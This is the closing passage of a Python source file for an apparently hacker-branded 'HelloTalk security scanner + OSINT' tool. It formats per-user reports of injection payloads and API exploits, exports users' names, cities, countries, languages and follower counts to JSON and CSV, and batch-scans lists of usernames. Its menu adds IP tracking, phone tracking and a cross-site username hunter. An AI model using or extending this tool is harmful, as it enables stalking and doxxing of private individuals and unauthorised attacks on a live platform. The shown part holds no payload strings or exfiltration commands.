        report.append(f"{Colors.HEADER}{'─'*60}")
        if sec.server_side_injections and any(i.injection_type != 'none_found' for i in sec.server_side_injections):
            for injection in sec.server_side_injections:
                if injection.injection_type != 'none_found':
                    severity_color = Colors.ERROR if injection.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if injection.severity == 'MEDIUM' else Colors.INFO
                    report.append(f"{severity_color}  [{injection.severity}] {injection.injection_type}:")
                    report.append(f"{Colors.DIM}     Parameter: {injection.parameter}")
                    report.append(f"{Colors.DIM}     Payload: {injection.payload}")
                    report.append(f"{Colors.DIM}     Evidence: {injection.evidence[:100]}...")
                    report.append(f"{Colors.DIM}     Remediation: {injection.remediation}")
        else:
            report.append(f"{Colors.SUCCESS}  ✅ No server-side injection vulnerabilities detected")
        
        found_social = [s for s in profile.social_media_presence if s.status == 'found']
        if found_social:
            report.append(f"\n{Colors.OSINT}🕵️ SOCIAL MEDIA FOUND ({len(found_social)})")
            report.append(f"{Colors.HEADER}{'─'*60}")
            for sm in found_social[:20]:
                report.append(f"{Colors.SUCCESS}  ✅ {sm.platform}: {Colors.DIM}{sm.url}")
        
        report.append(f"\n{Colors.STATS}📊 CVSS SCORES")
        report.append(f"{Colors.HEADER}{'─'*60}")
        for category, score in sec.cvss_scores.items():
            score_color = Colors.ERROR if score >= 7.0 else Colors.WARNING if score >= 4.0 else Colors.INFO
            report.append(f"{score_color}  {category.capitalize()}: {score:.1f}")
        
        report.append(f"\n{Colors.HEADER}{'═'*80}")
        report.append(f"{Colors.DIM}📊 Data Completeness: {profile.data_completeness} | 🕐 Scanned: {profile.scraped_at}")
        report.append(f"{Colors.HEADER}{'═'*80}")
        
        return '\n'.join(report)
    
    def export_to_json(self, profile: HelloTalkProfile, filename: str = None) -> str:
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"hellotalk_scan_{profile.username}_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(profile.to_dict(), f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"{Colors.EXPORT}💾 JSON: {Colors.HIGHLIGHT}{filename}")
        return filename
    
    def export_to_csv(self, profiles: List[HelloTalkProfile], filename: str = None) -> str:
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"hellotalk_profiles_{timestamp}.csv"
        
        rows = []
        for p in profiles:
            stats = p.stats
            found_social = [s for s in p.social_media_presence if s.status == 'found']
            rows.append({
                'Username': p.username,
                'Name': p.name,
                'Location': p.location,
                'Country': p.country,
                'City': p.city,
                'Native Language': ', '.join(p.native_language),
                'Learning Language': ', '.join(p.learning_language),
                'Level': stats.level,
                'Followers': stats.followers,
                'Following': stats.following,
                'Conversations': stats.conversations,
                'Avg Rating': stats.avg_rating,
                'Learning Progress': stats.learning_progress,
                'Verified': 'Yes' if p.is_verified else 'No',
                'Premium': 'Yes' if p.is_premium else 'No',
                'Overall Risk': p.security_test_results.overall_risk,
                'Auth Flaws': len(p.security_test_results.authentication_flaws),
                'API Exploits': len(p.security_test_results.api_exploitations),
                'Insecure Storage': len(p.security_test_results.insecure_storage),
                'Injection Issues': len(p.security_test_results.server_side_injections),
                'Social Media Found': len(found_social),
                'Data Completeness': p.data_completeness
            })
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            if rows:
                writer = csv.DictWriter(f, fieldnames=rows[0].keys())
                writer.writeheader()
                writer.writerows(rows)
        
        self.logger.info(f"{Colors.EXPORT}📊 CSV: {Colors.HIGHLIGHT}{filename}")
        return filename
    
    def batch_scan(self, usernames: List[str]) -> Dict[str, Optional[HelloTalkProfile]]:
        results = {}
        total = len(usernames)
        
        self.logger.info(f"{Colors.HEADER}{'═'*60}")
        self.logger.info(f"{Colors.ROCKET}🚀 Batch Scan: {total} profiles")
        self.logger.info(f"{Colors.HEADER}{'═'*60}")
        
        for i, username in enumerate(usernames, 1):
            try:
                profile = self.scan_profile(username)
                results[username] = profile
                status = f"{Colors.SUCCESS}✅" if profile else f"{Colors.ERROR}❌"
                risk = f" [Risk: {profile.security_test_results.overall_risk}]" if profile else ""
                self.logger.info(f"{status} [{i}/{total}] {username}{risk}")
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                self.logger.error(f"{Colors.ERROR}❌ [{i}/{total}] {username}: {e}")
                results[username] = None
        
        success = sum(1 for r in results.values() if r)
        critical = sum(1 for r in results.values() if r and r.security_test_results.overall_risk == 'CRITICAL')
        
        self.logger.info(f"{Colors.HEADER}{'═'*60}")
        self.logger.info(f"{Colors.SUCCESS}✅ Complete: {success}/{total} successful")
        if critical > 0:
            self.logger.info(f"{Colors.ERROR}🔥 CRITICAL risk detected in {critical} profiles")
        self.logger.info(f"{Colors.HEADER}{'═'*60}")
        
        return results

# ============================================================================
# 🎮 INTERACTIVE CLI
# ============================================================================

def interactive_mode():
    scanner = HelloTalkProfileScanner()
    
    while True:
        print(f"""
{Colors.HEADER}╔{'═'*68}╗
{Colors.HEADER}║{Colors.SHIELD}🛡️ HELLOTALK SECURITY SCANNER + OSINT BY SYLHETYHACKVENGER (THE-ERROR808) {Colors.OSINT}║
{Colors.HEADER}╠{'═'*68}╣
{Colors.HEADER}║{Colors.INFO}  1. 🎯 Scan Profile + Security + Social{Colors.HEADER}       ║
{Colors.HEADER}║{Colors.INFO}  2. 🌐 IP Tracker{Colors.HEADER}                            ║
{Colors.HEADER}║{Colors.INFO}  3. 📱 Phone Tracker{Colors.HEADER}                        ║
{Colors.HEADER}║{Colors.INFO}  4. 🕵️ Username Hunter (Auto-Clean){Colors.HEADER}          ║
{Colors.HEADER}║{Colors.INFO}  5. 📊 Generate Report{Colors.HEADER}                      ║
{Colors.HEADER}║{Colors.INFO}  6. 💾 Export JSON{Colors.HEADER}                          ║
{Colors.HEADER}║{Colors.ERROR}  7. 🚪 Exit{Colors.HEADER}                                   ║
{Colors.HEADER}╚{'═'*68}╝
        """)
        
        choice = input(f"{Colors.INFO}👉 Choose (1-7): {Colors.RESET}").strip()
        
        if choice == '7':
            print(f"\n{Colors.SUCCESS}👋 Goodbye!{Colors.RESET}")
            break
        
        elif choice == '1':
            username = input(f"{Colors.INFO}👤 Enter HelloTalk username: {Colors.RESET}").strip()
            if username:
                profile = scanner.scan_profile(username, test_security=True, hunt_social=True)
                if profile:
                    print(scanner.generate_comprehensive_report(profile))
                    export = input(f"{Colors.INFO}💾 Export to JSON? (y/n): {Colors.RESET}").lower()
                    if export == 'y':
                        scanner.export_to_json(profile)
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '2':
            print(f"\n{Colors.HEADER}{'═'*60}")
            print(f"{Colors.SCANNER} 🌐 IP TRACKER")
            print(f"{Colors.HEADER}{'═'*60}")
            print(f"{Colors.INFO}  1. Track My IP")
            print(f"{Colors.INFO}  2. Track Target IP")
            
            ip_choice = input(f"{Colors.INFO}👉 Choose (1-2): {Colors.RESET}").strip()
            
            if ip_choice == '1':
                my_ip = IPTracker.get_my_ip()
                ip_data = IPTracker.track_ip(my_ip)
                print(IPTracker.format_ip_info(ip_data))
            elif ip_choice == '2':
                target_ip = input(f"{Colors.INFO}🌐 Enter IP address: {Colors.RESET}").strip()
                if target_ip:
                    ip_data = IPTracker.track_ip(target_ip)
                    print(IPTracker.format_ip_info(ip_data))
            else:
                print(f"{Colors.ERROR}❌ Invalid choice{Colors.RESET}")
            
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '3':
            print(f"\n{Colors.HEADER}{'═'*60}")
            print(f"{Colors.SCANNER} 📱 PHONE TRACKER")
            print(f"{Colors.HEADER}{'═'*60}")
            
            phone = input(f"{Colors.INFO}📞 Enter phone number (e.g. +6281xxxxxxxxx): {Colors.RESET}").strip()
            if phone:
                region = input(f"{Colors.INFO}🌍 Enter default region (default: ID): {Colors.RESET}").strip() or "ID"
                phone_data = PhoneTracker.track_phone(phone, region)
                print(PhoneTracker.format_phone_info(phone_data))
            
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '4':
            username = input(f"{Colors.INFO}👤 Enter username to hunt: {Colors.RESET}").strip()
            if username:
                hunter = UsernameHunter(auto_clean=True)
                results = hunter.hunt(username)
                print(hunter.format_hunt_results(results))
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '5':
            if scanner.scanned_profiles:
                username = input(f"{Colors.INFO}👤 Enter username: {Colors.RESET}").strip()
                if username in scanner.scanned_profiles:
                    print(scanner.generate_comprehensive_report(scanner.scanned_profiles[username]))
                else:
                    print(f"{Colors.ERROR}❌ Profile not found in cache{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ No profiles scanned yet{Colors.RESET}")
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '6':
            if scanner.scanned_profiles:
                username = input(f"{Colors.INFO}👤 Enter username: {Colors.RESET}").strip()
                if username in scanner.scanned_profiles:
                    scanner.export_to_json(scanner.scanned_profiles[username])
                else:
                    print(f"{Colors.ERROR}❌ Profile not found in cache{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ No profiles scanned yet{Colors.RESET}")
            input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")

# ============================================================================
# 🚀 MAIN ENTRY POINT
# ============================================================================

def main():
    try:
        interactive_mode()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}⚠️ Interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
